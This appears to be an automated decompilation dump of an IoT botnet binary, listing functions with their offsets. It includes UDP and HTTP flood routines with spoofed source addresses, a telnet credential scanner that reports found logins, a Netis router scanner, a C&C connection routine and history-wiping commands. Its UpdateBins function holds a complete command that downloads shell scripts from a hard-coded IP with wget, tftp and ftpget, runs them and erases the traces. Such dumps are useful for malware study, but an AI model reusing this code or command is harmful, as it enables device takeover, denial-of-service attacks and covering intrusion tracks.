                                        sockprintf(v99, (int32_t)"Invalid flag \"%s\"");
                rand_cmwc();
                    rand_cmwc();
                *v116 = (int16_t)tcpcsum(v104, v105);
                while (true) {
                    __libc_sendto(v98, v104, v102, 0, (int32_t)&v118, (int32_t)&v118);
                    v111 = GetRandomIP(v101);
                    *(int16_t *)(v104 | 4) = (int16_t)rand_cmwc();
                    *v108 = rand_cmwc();
                    *v106 = (int16_t)rand_cmwc();
                    *v116 = (int16_t)tcpcsum(v104, v105);
        rand_cmwc();
            rand_cmwc();
        *v116 = (int16_t)tcpcsum(v104, v105);
        while (true) {
            __libc_sendto(v98, v104, v102, 0, (int32_t)&v118, (int32_t)&v118);
            v111 = GetRandomIP(v101);
            *(int16_t *)(v104 | 4) = (int16_t)rand_cmwc();
            *v108 = rand_cmwc();
            *v106 = (int16_t)rand_cmwc();
            *v116 = (int16_t)tcpcsum(v104, v105);
=================FUNCTION : prints ===================
++++++++ FUNCTION START 3723
++++++++ FUNCTION END 4248
++++++++ FUNCTION LENGTH 525
                while (true) {
                    printchar((int32_t *)a1, v101);
                        printchar((int32_t *)a1, v101);
                printchar((int32_t *)a1, (int32_t)*a2);
                    printchar((int32_t *)a1, (int32_t)*v105);
                    printchar((int32_t *)a1, v101);
                printchar((int32_t *)a1, v101);
        printchar((int32_t *)a1, (int32_t)*a2);
            printchar((int32_t *)a1, (int32_t)*v105);
            printchar((int32_t *)a1, v101);
                while (true) {
                    printchar((int32_t *)a1, v101);
                        printchar((int32_t *)a1, v101);
                printchar((int32_t *)a1, (int32_t)*a2);
                    printchar((int32_t *)a1, (int32_t)*v105);
                    printchar((int32_t *)a1, v101);
                printchar((int32_t *)a1, v101);
        printchar((int32_t *)a1, (int32_t)*a2);
            printchar((int32_t *)a1, (int32_t)*v105);
            printchar((int32_t *)a1, v101);
            while (true) {
                printchar((int32_t *)a1, v101);
                    printchar((int32_t *)a1, v101);
            printchar((int32_t *)a1, (int32_t)*a2);
                printchar((int32_t *)a1, (int32_t)*v105);
                printchar((int32_t *)a1, v101);
            printchar((int32_t *)a1, v101);
    printchar((int32_t *)a1, (int32_t)*a2);
        printchar((int32_t *)a1, (int32_t)*v105);
        printchar((int32_t *)a1, v101);
=================FUNCTION : StartTheLelz ===================
++++++++ FUNCTION START 10503
++++++++ FUNCTION END 11188
++++++++ FUNCTION LENGTH 685
    srand(v96 ^ rand_cmwc());
        while (true) {
        while (true) {
                case 0: {
                        GetRandomPublicIP(24, v100, v112, v114);
                                    socket(2, 1, 0);
                                        if (__libc_connect(*v111, (int32_t)&v97, 16) == -1) {
                    socket(2, 1, 0);
                case 1: {
                    while (true) {
                        getsockopt(*v120, 1, 4, (int32_t)&v125, v125);
                case 2: {
                case 3: {
                    if (__libc_send(*v130, v131, len, 0x4000) < 0) {
                        if (__libc_send(*v130, (int32_t)"\r\n", 2, 0x4000) < 0) {
                case 4: {
                case 5: {
                    if (__libc_send(*v135, v136, len2, 0x4000) < 0) {
                        if (__libc_send(*v135, (int32_t)"\r\n", 2, 0x4000) < 0) {
                case 6: {
                                    get_telstate_host(v105, v100, v106);
                                    sockprintf(v141, (int32_t)"LOGIN FOUND - %s:%s:%s");
                case 7: {
                    __libc_send(*v142, (int32_t)"sh\r\n", 4, 0x4000);
                    __libc_send(*v142, (int32_t)"shell\r\n", 7, 0x4000);
                    if (__libc_send(*v142, str3, len3, 0x4000) < 0) {
    while (true) {
    while (true) {
=================FUNCTION : sendUDP ===================
++++++++ FUNCTION START 11332
++++++++ FUNCTION END 11634
++++++++ FUNCTION LENGTH 302
        rand_cmwc();
    int32_t result = getHost(a1, &v98); // 0xe2ec
        int32_t v101 = socket(2, 2, 17); // 0xe334
            result3 = sockprintf(v100, (int32_t)"Failed opening raw socket.");
                makeRandomStr(v102, a5);
                while (true) {
                    while (true) {
                        __libc_sendto(v101, v102, a5, 0, (int32_t)&v97, 16);
                                rand_cmwc();
    int32_t v108 = socket(2, 3, 17); // 0xe4c0
        if (__GI_setsockopt(v108, 0, 3, (int32_t)&v109, 4) < 0) {
            result5 = sockprintf(v100, (int32_t)"Failed setting raw headers mode.");
                srand(v110 ^ rand_cmwc());
                init_rand(rand());
            makeIPPacket((char *)v113, v98, __GI_htonl(GetRandomIP(v111)), 17);
            *v114 = (int16_t)rand_cmwc();
                v115 = rand_cmwc();
            makeRandomStr(v113 + 28, a5);
            while (true) {
                while (true) {
                    __libc_sendto(v108, v113, a5 + 28, 0, (int32_t)&v127, (int32_t)&v127);
                    *v114 = (int16_t)rand_cmwc();
                        v128 = rand_cmwc();
                    *(int16_t *)(v113 | 4) = (int16_t)rand_cmwc();
                    *(int32_t *)(v113 + 12) = __GI_htonl(GetRandomIP(v111));
    result5 = sockprintf(v100, (int32_t)"Failed opening raw socket.");
=================FUNCTION : _ppfs_parsespec ===================
++++++++ FUNCTION START 27484
++++++++ FUNCTION END 28519
++++++++ FUNCTION LENGTH 1035
        while (true) {
                while (true) {
                    while (true) {
                                                                while (true) {
                                                                        while (true) {
                                                                                    while (true) {
                                                                                    while (true) {
                                                                            while (true) {
                                                                                        while (true) {
                                                        while (true) {
                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                            while (true) {
                                                    while (true) {
                                                                while (true) {
                                                            while (true) {
                                                            while (true) {
                                    while (true) {
                                        while (true) {
                                            while (true) {
    while (true) {
=================FUNCTION : malloc ===================
++++++++ FUNCTION START 36185
++++++++ FUNCTION END 39018
++++++++ FUNCTION LENGTH 2833
                                                                free();
                                                            free();
                                                            free();
                                                        free();
                                                free();
                                            free();
                                            free();
                                        free();
        while (true) {
                    while (true) {
                            while (true) {
                                while (true) {
                                                                                            free();
                                                                                        free();
                                                                                        free();
                                                                                    free();
                                                                            free();
                                                                        free();
                                                                        free();
                                                                    free();
                while (true) {
=================FUNCTION : gethostbyname_r ===================
++++++++ FUNCTION START 66405
++++++++ FUNCTION END 66840
++++++++ FUNCTION LENGTH 435
    int32_t v103 = __get_hosts_byname_r(str, 2, v98, v99, v100, v102, v101); // 0x1c0b4
                    if (inet_aton((char *)str, v116 + 16) != str2) {
                    if (__dns_lookup((char *)str, 1, (int32_t)&v106, v117) < 0) {
                            free();
                            free();
                        free();
                        free();
                            if (inet_aton((char *)str, v116 + 16) != str2) {
                            if (__dns_lookup((char *)str, 1, (int32_t)&v106, v117) < 0) {
                                    free();
                                    free();
                                free();
                                free();
                if (inet_aton((char *)str, v116 + 16) != str2) {
                if (__dns_lookup((char *)str, 1, (int32_t)&v106, v117) < 0) {
                        free();
                        free();
                    free();
                    free();
=================FUNCTION : _memcpy ===================
++++++++ FUNCTION START 56297
++++++++ FUNCTION END 58126
++++++++ FUNCTION LENGTH 1829
                            while (true) {
                        while (true) {
                        while (true) {
                        while (true) {
                            while (true) {
                            while (true) {
                            while (true) {
                        while (true) {
                                while (true) {
                                        while (true) {
                                while (true) {
                                while (true) {
                        case -1: {
                                while (true) {
                        case -2: {
                                while (true) {
                                while (true) {
                    while (true) {
=================FUNCTION : getOurIP ===================
++++++++ FUNCTION START 18017
++++++++ FUNCTION END 18259
++++++++ FUNCTION LENGTH 242
    int32_t v97 = socket(2, 2, 0); // 0x10a5c
    inet_addr((int32_t)"8.8.8.8");
    if (__libc_connect(v97, (int32_t)&v98, 16) == -1) {
    if (__GI_getsockname(v97, v101, (int32_t)&v99, v101, 16) == -1) {
        int32_t v104 = __GI_open((int32_t)"/proc/net/route", 0); // 0x10b4c
        while (true) {
            if (fdgets(v106, 0x1000, v104, v106) != 0) {
                if (strstr(v106, "\t00000000\t") != 0) {
                        __GI_close(v104);
                            __GI_close(v97);
                        __GI_close(v97);
                    __GI_close(v104);
                        __GI_close(v97);
                    __GI_close(v97);
            __GI_close(v104);
                __GI_close(v97);
            __GI_close(v97);
=================FUNCTION : __open_nameservers ===================
++++++++ FUNCTION START 65786
++++++++ FUNCTION END 66181
++++++++ FUNCTION LENGTH 395
        int32_t v107 = __GI_fopen(v96 - 1296, v96 - 2268); // 0x1bb9c
            if (fgets(v118, 128, v107) != 0) {
                while (true) {
                        if (inet_pton(10, (char *)v120, (int32_t)&v124) < 1) {
                            if (inet_pton(2, (char *)v120, (int32_t)&v127) >= 1) {
                            if (fgets(v118, 128, v107) == 0) {
                        if (fgets(v118, 128, v107) == 0) {
                            while (true) {
                                free();
                        while (true) {
                        if (fgets(v118, 128, v107) == 0) {
                __GI_fclose((int16_t *)v107);
                    if (__GI_gethostname(v111, 255) == 0) {
                                        free();
            __GI_fclose((int16_t *)v107);
            if (__GI_gethostname(v111, 255) == 0) {
                    free();
=================FUNCTION : gethostbyname2_r ===================
++++++++ FUNCTION START 60025
++++++++ FUNCTION END 60391
++++++++ FUNCTION LENGTH 366
        result = gethostbyname_r();
                int32_t v101 = __get_hosts_byname_r(a1, a2, v98, a4, a5, a6, a7); // 0x19fa0
                                if (inet_pton(10, (char *)a1, v109) == v102) {
                                        while (true) {
                                            v111 = __dns_lookup((char *)v103, 28, v110, (int32_t)&v105);
                    if (inet_pton(10, (char *)a1, v109) == v102) {
                            while (true) {
                                v111 = __dns_lookup((char *)v103, 28, v110, (int32_t)&v105);
                if (inet_pton(10, (char *)a1, v109) == v102) {
                        while (true) {
                            v111 = __dns_lookup((char *)v103, 28, v110, (int32_t)&v105);
                                free();
                                        free();
                                    free();
                                free();
=================FUNCTION : _stdio_fopen ===================
++++++++ FUNCTION START 23651
++++++++ FUNCTION END 24617
++++++++ FUNCTION LENGTH 966
                if (__GI_open(v99, v104) < 0) {
                        free();
                            free();
                    free();
                if (__GI_open(v99, v104) < 0) {
                        free();
                            free();
                    free();
                    free();
        if (__GI_open(v99, v104) < 0) {
                free();
            free();
                free();
=================FUNCTION : __read_etc_hosts_r ===================
++++++++ FUNCTION START 67977
++++++++ FUNCTION END 68219
++++++++ FUNCTION LENGTH 242
            int32_t v101 = __open_etc_hosts(); // 0x1c784
        while (true) {
                    __GI_config_close((int32_t *)v99);
                        if (inet_pton(v113, (char *)v114, v106) >= 1) {
                            __GI_config_close((int32_t *)v99);
                            if (inet_pton(10, (char *)v115, v106) >= 1) {
                                __GI_config_close((int32_t *)v99);
        while (true) {
            if (__GI_strcasecmp(v109, v111) == 0) {
        while (true) {
            __GI_config_close((int32_t *)v99);
=================FUNCTION : print ===================
++++++++ FUNCTION START 4466
++++++++ FUNCTION END 4853
++++++++ FUNCTION LENGTH 387
    while (true) {
                    printchar(a1, (int32_t)*v101);
                        while (true) {
                            while (true) {
                                int32_t v124 = prints(v98, v121, v112, v106, (int32_t)&v123); // 0x8a9c
                                    int32_t v126 = printi(v98, v125, 10, 1, v112, v106, 97) + result; // 0x8b0c
                                        int32_t v128 = printi(v98, v127, 16, 0, v112, v106, 97) + result; // 0x8b70
                                            int32_t v130 = printi(v98, v129, 16, 0, v112, v106, 65) + result; // 0x8bd4
                                                int32_t v133 = printi(v98, v132, 10, 0, v112, v106, 97) + result; // 0x8c38
                                                    int32_t v136 = prints(v98, (char *)&v100, v112, v106, v134); // 0x8c8c
            printchar(a1, (int32_t)*v101);
=================FUNCTION : getBogos ===================
++++++++ FUNCTION START 6391
++++++++ FUNCTION END 6558
++++++++ FUNCTION LENGTH 167
    int32_t v98 = __GI_open((int32_t)"/proc/cpuinfo", 0); // 0x9674
    while (true) {
        if (fdgets(v100, 0x1000, v98, v100) == 0) {
            __GI_close(v98);
        uppercase((char *)&v99);
        if (strstr(v100, "BOGOMIPS") == v100) {
            while (true) {
                            while (true) {
                                        __GI_close(v98);
=================FUNCTION : __GI_inet_ntop ===================
++++++++ FUNCTION START 64005
++++++++ FUNCTION END 64456
++++++++ FUNCTION LENGTH 451
        result = inet_ntop4(a2, a3, a4);
        while (true) {
                while (true) {
                            while (true) {
                                                        if (inet_ntop4(a2 + 12, v136, v101 - v136 - 32) == 0) {
                                                v134 = sprintf(v136, v115, v132, v133, (int32_t)&v135, (int32_t)&v135, (int32_t)&v135);
                                            if (inet_ntop4(a2 + 12, v136, v101 - v136 - 32) == 0) {
                                v134 = sprintf(v130, v115, v132, v133, (int32_t)&v135, (int32_t)&v135, (int32_t)&v135);
                while (true) {
=================FUNCTION : printi ===================
++++++++ FUNCTION START 4251
++++++++ FUNCTION END 4463
++++++++ FUNCTION LENGTH 212
        result2 = prints(a1, (char *)&v98, a5, a6, 0);
            while (true) {
                        printchar((int32_t *)a1, 45);
                        result = prints(a1, v102, a5 - 1, a6, (int32_t)&v105);
            result = prints(a1, v103, a5, a6, (int32_t)&v105);
                    printchar((int32_t *)a1, 45);
                    result = prints(a1, v102, a5 - 1, a6, (int32_t)&v105);
        result2 = prints(a1, v103, a5, a6, (int32_t)&v105);
=================FUNCTION : __GI_config_read ===================
++++++++ FUNCTION START 49568
++++++++ FUNCTION END 50032
++++++++ FUNCTION LENGTH 464
        while (true) {
            while (true) {
                int32_t v120 = fgets(v117 + v110, v119 - v110, v118); // 0x181b0
                        while (true) {
                                    v127 = getc_unlocked((int16_t *)v128);
                                                while (true) {
                                                                    while (true) {
                            v127 = __GI_fgetc(v128);
=================FUNCTION : negotiate ===================
++++++++ FUNCTION START 8320
++++++++ FUNCTION END 8494
++++++++ FUNCTION LENGTH 174
        __libc_send(a1, v101, 1, 0x4000);
                __libc_send(a1, v101, 1, 0x4000);
                __libc_send(a1, a2 + 2, 1, 0x4000);
            __libc_send(a1, v101, 1, 0x4000);
            __libc_send(a1, a2 + 2, 1, 0x4000);
        __libc_send(a1, v101, 1, 0x4000);
        __libc_send(a1, a2 + 2, 1, 0x4000);
=================FUNCTION : inet_pton ===================
++++++++ FUNCTION START 63440
++++++++ FUNCTION END 63849
++++++++ FUNCTION LENGTH 409
        return inet_pton4(v97, a3);
                    while (true) {
        while (true) {
                        if (inet_pton4(v104, v102) > 0) {
                                    while (true) {
                                    while (true) {
                                    while (true) {
=================FUNCTION : sendHTTP ===================
++++++++ FUNCTION START 12337
++++++++ FUNCTION END 12495
++++++++ FUNCTION LENGTH 158
    rand();
    int32_t v99 = rand() % 674; // 0xf310
    int32_t result = sprintf(v101, (int32_t)"%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n", a2, a4, v102, v103, v99);
    while (true) {
        if (__libc_fork() != 0) {
            while (true) {
                    if (socket_connect(a1, a3) != 0) {
=================FUNCTION : sendSTD ===================
++++++++ FUNCTION START 11191
++++++++ FUNCTION END 11329
++++++++ FUNCTION LENGTH 138
    int32_t v98 = socket(2, 2, 0); // 0xe0e8
    __GI_gethostbyname(a1);
    while (true) {
        rand();
            __libc_send(v98, v110, 65, 0);
            __libc_connect(v98, v101, 16);
                __GI_close(v98);
=================FUNCTION : nprocessors_onln ===================
++++++++ FUNCTION START 43446
++++++++ FUNCTION END 43616
++++++++ FUNCTION LENGTH 170
    int32_t v101 = __GI_config_open((int32_t)&v97 - 2308); // 0x16b80
        int32_t v104 = __GI_config_open(v98 - 2292); // 0x16c0c
            while (true) {
        __GI_config_close((int32_t *)v102);
    while (true) {
        __GI_config_close((int32_t *)v102);
=================FUNCTION : NetisRanges ===================
++++++++ FUNCTION START 9668
++++++++ FUNCTION END 9779
++++++++ FUNCTION LENGTH 111
    rand();
    int32_t v96 = rand(); // 0xc6bc
    int32_t v98 = rand(); // 0xc708
    int32_t v100 = rand(); // 0xc754
    szprintf(v103, (int32_t)"%d.%d.%d.%d", (int32_t)v104, (int32_t)v97, (int32_t)v99);
    return inet_addr(v103);
=================FUNCTION : recvLine ===================
++++++++ FUNCTION START 6802
++++++++ FUNCTION END 7021
++++++++ FUNCTION LENGTH 219
            while (true) {
                sockprintf(v105, (int32_t)"PING");
                while (true) {
                    if (__libc_recv(v105, (int32_t)&v106, 1, 0, v109) != 1) {
        while (true) {
            if (__libc_recv(v105, (int32_t)&v106, 1, 0, v109) == 1) {
=================FUNCTION : __GI_memchr ===================
++++++++ FUNCTION START 58129
++++++++ FUNCTION END 58405
++++++++ FUNCTION LENGTH 276
        while (true) {
                while (true) {
                while (true) {
            while (true) {
        while (true) {
        while (true) {
=================FUNCTION : realloc ===================
++++++++ FUNCTION START 39130
++++++++ FUNCTION END 39521
++++++++ FUNCTION LENGTH 391
        free();
                    free();
                            free();
                    free();
                free();
                free();
=================FUNCTION : getCores ===================
++++++++ FUNCTION START 6561
++++++++ FUNCTION END 6685
++++++++ FUNCTION LENGTH 124
    int32_t v100 = __GI_open((int32_t)"/proc/cpuinfo", 0); // 0x98a4
    while (true) {
        if (fdgets(v99, 0x1000, v100, v99) == 0) {
            __GI_close(v100);
        uppercase((char *)&v98);
        if (strstr(v99, "BOGOMIPS") == v99) {
=================FUNCTION : NetisScanner ===================
++++++++ FUNCTION START 12116
++++++++ FUNCTION END 12229
++++++++ FUNCTION LENGTH 113
    while (true) {
        int32_t v101 = socket(2, 2, 17); // 0xf104
        NetisRanges();
        __libc_sendto(v101, (int32_t)"AAAAAAAAnetcore", strlen("AAAAAAAAnetcore"), 0, v100, 16);
        __libc_sendto(v101, (int32_t)"AA", strlen("AA"), 0, v100, 16);
        __GI_close(v101);
=================FUNCTION : memrchr ===================
++++++++ FUNCTION START 58868
++++++++ FUNCTION END 59117
++++++++ FUNCTION LENGTH 249
        while (true) {
                while (true) {
                while (true) {
            while (true) {
        while (true) {
    while (true) {
=================FUNCTION : UpdateBins ===================
++++++++ FUNCTION START 12616
++++++++ FUNCTION END 12728
++++++++ FUNCTION LENGTH 112
    int32_t v98 = __libc_fork(); // 0xf550
    int32_t chars_printed;
        __libc_system((int32_t)"cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://207.148.12.91/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 207.148.12.91 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 207.148.12.91; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c");
        chars_printed = sleep(20);
        chars_printed = printf("%d\n", v98);
    return chars_printed;
=================FUNCTION : fdpclose ===================
++++++++ FUNCTION START 5581
++++++++ FUNCTION END 5738
++++++++ FUNCTION LENGTH 157
    __GI_close(a1);
    __GI_sigprocmask(0, v100, v102, v100);
    while (true) {
        v104 = __libc_waitpid(v105, (int32_t)&v103, 0);
        __GI_sigprocmask(2, v102, 0, v102);
    __GI_sigprocmask(2, v102, 0, v102);
=================FUNCTION : _vfprintf_internal ===================
++++++++ FUNCTION START 25917
++++++++ FUNCTION END 26811
++++++++ FUNCTION LENGTH 894
    while (true) {
        while (true) {
                while (true) {
                                                while (true) {
                                                            while (true) {
=================FUNCTION : fflush_unlocked ===================
++++++++ FUNCTION START 29537
++++++++ FUNCTION END 29769
++++++++ FUNCTION LENGTH 232
            while (true) {
        _stdio_openlist_dec_use();
        _stdio_openlist_dec_use();
    while (true) {
    _stdio_openlist_dec_use();
=================FUNCTION : sendCNC ===================
++++++++ FUNCTION START 12498
++++++++ FUNCTION END 12613
++++++++ FUNCTION LENGTH 115
    inet_addr(a1);
        int32_t v100 = socket(2, 1, 0); // 0xf4ec
        __libc_connect(v100, (int32_t)&v99, 16);
        __GI_close(v100);
=================FUNCTION : __aeabi_idiv ===================
++++++++ FUNCTION START 68552
++++++++ FUNCTION END 69064
++++++++ FUNCTION LENGTH 512
        while (true) {
                                    while (true) {
                                        while (true) {
                    while (true) {
=================FUNCTION : srandom_r ===================
++++++++ FUNCTION START 42042
++++++++ FUNCTION END 42222
++++++++ FUNCTION LENGTH 180
                while (true) {
                        while (true) {
                            __GI_random_r((int32_t *)v97, (int32_t)&v109);
            while (true) {
=================FUNCTION : readUntil ===================
++++++++ FUNCTION START 8669
++++++++ FUNCTION END 8862
++++++++ FUNCTION LENGTH 193
    while (true) {
        int32_t v104 = __libc_recv(a1, v103, 1, 0, v103); // 0xa9dc
                    if (strstr(a6, (char *)a2) == 0) {
                int32_t v105 = __libc_recv(a1, v103 + 1, 2, 0, v101); // 0xaa44
=================FUNCTION : socket_connect ===================
++++++++ FUNCTION START 10365
++++++++ FUNCTION END 10500
++++++++ FUNCTION LENGTH 135
    int32_t v99 = __GI_gethostbyname(a1); // 0xcc54
    int32_t v105 = socket(2, 1, 6); // 0xcccc
    __GI_setsockopt(v105, 6, 1, (int32_t)&v98, 4);
    if (__libc_connect(v105, (int32_t)&v104, 16) == -1) {
=================FUNCTION : __udivsi3 ===================
++++++++ FUNCTION START 19080
++++++++ FUNCTION END 19533
++++++++ FUNCTION LENGTH 453
    while (true) {
                                while (true) {
                                    while (true) {
                while (true) {
=================FUNCTION : getcwd ===================
++++++++ FUNCTION START 20197
++++++++ FUNCTION END 20491
++++++++ FUNCTION LENGTH 294
            int32_t v101 = __GI_getpagesize(); // 0x11c18
                    free();
            free();
            free();
=================FUNCTION : strncpy ===================
++++++++ FUNCTION START 31910
++++++++ FUNCTION END 32113
++++++++ FUNCTION LENGTH 203
            while (true) {
                        while (true) {
    while (true) {
            while (true) {
=================FUNCTION : strstr ===================
++++++++ FUNCTION START 31142
++++++++ FUNCTION END 31395
++++++++ FUNCTION LENGTH 253
    while (true) {
    while (true) {
        while (true) {
                            while (true) {
=================FUNCTION : connectTimeout ===================
++++++++ FUNCTION START 8022
++++++++ FUNCTION END 8183
++++++++ FUNCTION LENGTH 161
    if (getHost(a2, &v99) != 0) {
    if (__libc_connect(a1, (int32_t)&v98, 16) >= 0) {
    getsockopt(a1, 1, 4, (int32_t)&v107, (int32_t)&v106);
=================FUNCTION : botkiller ===================
++++++++ FUNCTION START 11993
++++++++ FUNCTION END 12113
++++++++ FUNCTION LENGTH 120
    while (true) {
            __libc_system(v98);
            __libc_system(v98);
=================FUNCTION : _ppfs_setargs ===================
++++++++ FUNCTION START 27086
++++++++ FUNCTION END 27354
++++++++ FUNCTION LENGTH 268
            while (true) {
                                    case 256: {
                                    case 512: {
=================FUNCTION : listFork ===================
++++++++ FUNCTION START 8186
++++++++ FUNCTION END 8317
++++++++ FUNCTION LENGTH 131
    int32_t result = __libc_fork(); // 0xa40c
    while (true) {
                free();
=================FUNCTION : __GI_wcsnrtombs ===================
++++++++ FUNCTION START 50505
++++++++ FUNCTION END 50781
++++++++ FUNCTION LENGTH 276
            while (true) {
            while (true) {
        while (true) {
=================FUNCTION : sockprintf ===================
++++++++ FUNCTION START 5061
++++++++ FUNCTION END 5169
++++++++ FUNCTION LENGTH 108
    print(&v99, a2, (int32_t)&v100);
    int32_t result = __libc_send(a1, v98, strlen(str), 0x4000); // 0x8e44
    free();
=================FUNCTION : initConnection ===================
++++++++ FUNCTION START 17881
++++++++ FUNCTION END 18014
++++++++ FUNCTION LENGTH 133
        __GI_close(v99);
    int32_t v106 = socket(2, 1, 0); // 0x109b8
    return connectTimeout(v106, v97, v104, 30) == 0;
=================FUNCTION : strnlen ===================
++++++++ FUNCTION START 31398
++++++++ FUNCTION END 31662
++++++++ FUNCTION LENGTH 264
                while (true) {
            while (true) {
                while (true) {
=================FUNCTION : _stdio_term ===================
++++++++ FUNCTION START 24949
++++++++ FUNCTION END 25126
++++++++ FUNCTION LENGTH 177
        while (true) {
            while (true) {
    while (true) {
=================FUNCTION : __GI_strchrnul ===================
++++++++ FUNCTION START 59495
++++++++ FUNCTION END 59689
++++++++ FUNCTION LENGTH 194
        while (true) {
        while (true) {
    while (true) {
=================FUNCTION : ClearHistory ===================
++++++++ FUNCTION START 12232
++++++++ FUNCTION END 12334
++++++++ FUNCTION LENGTH 102
    __libc_system((int32_t)"history -c;history -w");
    __libc_system((int32_t)"cd /root;rm -rf .bash_history");
    return __libc_system((int32_t)"cd /var/tmp; rm -f *");
=================FUNCTION : __GI_strchr ===================
++++++++ FUNCTION START 32116
++++++++ FUNCTION END 32338
++++++++ FUNCTION LENGTH 222
        while (true) {
        while (true) {
        while (true) {
=================FUNCTION : trim ===================
++++++++ FUNCTION START 3445
++++++++ FUNCTION END 3605
++++++++ FUNCTION LENGTH 160
        while (true) {
            while (true) {
    while (true) {
=================FUNCTION : __GI_initstate_r ===================
++++++++ FUNCTION START 42339
++++++++ FUNCTION END 42520
++++++++ FUNCTION LENGTH 181
        srandom_r((int32_t *)v98, a3);
        srandom_r((int32_t *)v98, a3);
    srandom_r((int32_t *)v98, a3);
=================FUNCTION : _stdlib_strto_l ===================
++++++++ FUNCTION START 42729
++++++++ FUNCTION END 43179
++++++++ FUNCTION LENGTH 450
    while (true) {
                        while (true) {
                while (true) {
=================FUNCTION : contains_string ===================
++++++++ FUNCTION START 7893
++++++++ FUNCTION END 8019
++++++++ FUNCTION LENGTH 126
    while (true) {
            if (strcasestr((char *)a1, v101, 4 * v100) != 0) {
=================FUNCTION : __libc_system ===================
++++++++ FUNCTION START 46264
++++++++ FUNCTION END 46408
++++++++ FUNCTION LENGTH 144
    int32_t v100 = __vfork(); // 0x17828
        v102 = wait4(v100, (int32_t)&v102);
=================FUNCTION : __GI_strspn ===================
++++++++ FUNCTION START 59120
++++++++ FUNCTION END 59260
++++++++ FUNCTION LENGTH 140
    while (true) {
        while (true) {
=================FUNCTION : __GI_closedir ===================
++++++++ FUNCTION START 48548
++++++++ FUNCTION END 48678
++++++++ FUNCTION LENGTH 130
        free();
        free();
=================FUNCTION : _uintmaxtostr ===================
++++++++ FUNCTION START 51738
++++++++ FUNCTION END 51961
++++++++ FUNCTION LENGTH 223
            while (true) {
    while (true) {
=================FUNCTION : matchPrompt ===================
++++++++ FUNCTION START 8497
++++++++ FUNCTION END 8666
++++++++ FUNCTION LENGTH 169
    while (true) {
                while (true) {
=================FUNCTION : strcasestr ===================
++++++++ FUNCTION START 32926
++++++++ FUNCTION END 33074
++++++++ FUNCTION LENGTH 148
    while (true) {
        while (true) {
=================FUNCTION : __GI_strpbrk ===================
++++++++ FUNCTION START 59692
++++++++ FUNCTION END 59819
++++++++ FUNCTION LENGTH 127
    while (true) {
        while (true) {
=================FUNCTION : __GI_vfprintf ===================
++++++++ FUNCTION START 25354
++++++++ FUNCTION END 25502
++++++++ FUNCTION LENGTH 148
        result = _vfprintf_internal(v97, (char *)a2, a3);
            result = _vfprintf_internal(v97, (char *)a2, a3);
=================FUNCTION : __GI_fclose ===================
++++++++ FUNCTION START 23034
++++++++ FUNCTION END 23198
++++++++ FUNCTION LENGTH 164
    if (__GI_close(v104) < 0) {
    _stdio_openlist_dec_use();
=================FUNCTION : __GI_fgetc ===================
++++++++ FUNCTION START 55788
++++++++ FUNCTION END 55932
++++++++ FUNCTION LENGTH 144
            result = getc_unlocked((int16_t *)a1);
        result = getc_unlocked((int16_t *)a1);
=================FUNCTION : __GI_memset ===================
++++++++ FUNCTION START 30474
++++++++ FUNCTION END 30700
++++++++ FUNCTION LENGTH 226
        while (true) {
        while (true) {
=================FUNCTION : __stdio_WRITE ===================
++++++++ FUNCTION START 50784
++++++++ FUNCTION END 50964
++++++++ FUNCTION LENGTH 180
    while (true) {
            while (true) {
=================FUNCTION : __GI_fgets_unlocked ===================
++++++++ FUNCTION START 29881
++++++++ FUNCTION END 30079
++++++++ FUNCTION LENGTH 198
            while (true) {
                uint32_t v105 = getc_unlocked((int16_t *)a3); // 0x14048
=================FUNCTION : readdir64 ===================
++++++++ FUNCTION START 49207
++++++++ FUNCTION END 49353
++++++++ FUNCTION LENGTH 146
    while (true) {
            if (__getdents64(v109, (int32_t *)v110, v111, v102) < 1) {
=================FUNCTION : rawmemchr ===================
++++++++ FUNCTION START 58670
++++++++ FUNCTION END 58865
++++++++ FUNCTION LENGTH 195
        while (true) {
    while (true) {
=================FUNCTION : abort ===================
++++++++ FUNCTION START 40531
++++++++ FUNCTION END 40685
++++++++ FUNCTION LENGTH 154
    __GI_sigprocmask(1, (int32_t)&v99, 0, 32);
    while (true) {
=================FUNCTION : __close_nameservers ===================
++++++++ FUNCTION START 66184
++++++++ FUNCTION END 66299
++++++++ FUNCTION LENGTH 115
        free();
    return free();
=================FUNCTION : inet_aton ===================
++++++++ FUNCTION START 59822
++++++++ FUNCTION END 60022
++++++++ FUNCTION LENGTH 200
        while (true) {
            while (true) {
=================FUNCTION : __aeabi_ddiv ===================
++++++++ FUNCTION START 72342
++++++++ FUNCTION END 72971
++++++++ FUNCTION LENGTH 629
            while (true) {
                while (true) {
=================FUNCTION : __malloc_consolidate ===================
++++++++ FUNCTION START 39763
++++++++ FUNCTION END 39992
++++++++ FUNCTION LENGTH 229
        while (true) {
                while (true) {
=================FUNCTION : __GI_config_close ===================
++++++++ FUNCTION START 50035
++++++++ FUNCTION END 50150
++++++++ FUNCTION LENGTH 115
    __GI_fclose((int16_t *)*a1);
    return free();
=================FUNCTION : srand ===================
++++++++ FUNCTION START 41565
++++++++ FUNCTION END 41673
++++++++ FUNCTION LENGTH 108
    srandom_r((int32_t *)a1, (int32_t)&v99 + 1276);
=================FUNCTION : strcspn ===================
++++++++ FUNCTION START 58537
++++++++ FUNCTION END 58667
++++++++ FUNCTION LENGTH 130
    while (true) {
=================FUNCTION : sclose ===================
++++++++ FUNCTION START 10255
++++++++ FUNCTION END 10362
++++++++ FUNCTION LENGTH 107
        __GI_close(a1);
=================FUNCTION : __xpg_strerror_r ===================
++++++++ FUNCTION START 32689
++++++++ FUNCTION END 32923
++++++++ FUNCTION LENGTH 234
        while (true) {
=================FUNCTION : rand ===================
++++++++ FUNCTION START 40797
++++++++ FUNCTION END 40897
++++++++ FUNCTION LENGTH 100
    return random();
=================FUNCTION : _promoted_size ===================
++++++++ FUNCTION START 27357
++++++++ FUNCTION END 27481
++++++++ FUNCTION LENGTH 124
    while (true) {
